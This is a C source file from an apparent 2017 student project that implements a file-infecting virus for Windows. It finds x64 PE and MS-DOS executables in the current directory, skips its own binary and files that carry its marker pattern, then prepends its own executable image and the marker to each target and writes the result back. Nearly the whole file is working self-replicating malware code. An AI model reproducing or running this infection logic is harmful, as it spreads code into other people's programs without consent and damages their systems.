/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

/*
** Infect windows Portable executable
*/
void		infect_pe_file(char *argv, IMAGE_DOS *img) {
	char	pattern[] = { PATTERN };

	if (is_pe_x64(img->pe_header) == false)
		return ;
	if (strcmp(file_base_name(img->name), file_base_name(argv)) == 0)
		return ;
	printf("Infect %s\n", img->name);
	int pattern_position = find_pattern(img->buffer, img->len);
	if (pattern_position != -1)//is file infected
	{
		printf("%s already infected\n", img->name);
		return ;
	}
	char *infection_content = NULL;
	int infection_size = 0;

	if ((infection_size = windows_file_get_contents_size(&infection_content, argv)) <= 0)
		return ;
	int final_len = img->len + infection_size + sizeof(pattern);
	img->new_buffer = malloc(final_len);
	if (img->new_buffer == NULL)
		return ;
	memcpy(img->new_buffer, infection_content, infection_size);
	memcpy(img->new_buffer + infection_size, (char*)pattern, sizeof(pattern));
	memcpy(img->new_buffer + infection_size + sizeof(pattern), img->buffer, img->len);
	printf("%s infected, final_len: %d, infection_size: %d\n", img->name, final_len, infection_size);
	windows_file_put_contents_size(img->name, img->new_buffer, final_len);
}

/*
** Infect MS-DOS executable
*/
void		infect_dos_file(char *argv, IMAGE_DOS *img) {
	if (img->len < sizeof(struct _IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS)) {
		return ;
	}
	img->dos_header = (IMAGE_DOS_HEADER*)img->buffer;
	img->pe_header = (IMAGE_NT_HEADERS*)(img->buffer + img->dos_header->e_lfanew);
	if (is_pe_signature(img->pe_header))
	{
		infect_pe_file(argv, img);
	}
	free(img);
}

/*
** Infect PE or MS-DOS windows files
*/
void		infect_file(char *argv, char *file_path) {
	char	*file = NULL;
	size_t	size = windows_file_get_contents_size(&file, file_path);
	int		file_type = get_windows_binary_type(file);

	if (file_type == IS_DOS_BINARY_TYPE) {
		IMAGE_DOS *img = (struct _IMAGE_DOS*)malloc(sizeof(struct _IMAGE_DOS));

		if (img == NULL)
			return ;
		img->buffer = file;
		img->len = size;
		img->name = file_path;
		infect_dos_file(argv, img);
	}
}

/*
** Infect with recursivity all Windows binary files (PE, MS-DOS)
*/
void		infect(char *argv) {
	char **files = NULL;

	files = get_files_types(files, ".", is_windows_binary_file);

	for (int i = 0; files[i]; i++) {
		infect_file(argv, files[i]);
	}
	free_array(files);
}
